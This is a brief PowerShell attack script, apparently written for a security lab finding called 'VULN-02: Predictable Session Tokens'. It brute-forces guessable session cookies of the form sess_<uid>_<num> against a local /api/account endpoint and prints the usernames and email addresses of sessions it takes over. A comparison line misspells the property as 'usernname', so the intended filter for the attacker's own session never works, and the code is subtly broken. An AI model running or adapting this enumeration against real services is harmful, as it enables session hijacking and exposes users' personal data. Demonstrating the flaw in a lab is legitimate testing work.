# Attack script for VULN-02: Predictable Session Tokens
# Enumerates userId/sessionNumber combinations and checks each against
# the protected /api/account endpoint, looking for sessions that aren't ours. 

$myUsername = "testuser" # the attackers identity, filtering out self-hits

for ($uid = 1; $uid -le 10; $uid++) {
    for ($num = 1; $num -le 20; $num++) {
        $guessedToken = "sess_${uid}_${num}"

    $json = curl.exe -s -b "session_token=$guessedToken" http://localhost:3000/api/account
    $response = $json | ConvertFrom-Json -ErrorAction SilentlyContinue

    if ($response -and $response.username -and $response.usernname -ne $myUsername) {
        Write-Host "HIT: $guessedToken -> user: $($response.username), email: $($response.email)" -ForegroundColor Red
    }
}
}

Write-Host "Brute-force scan complete"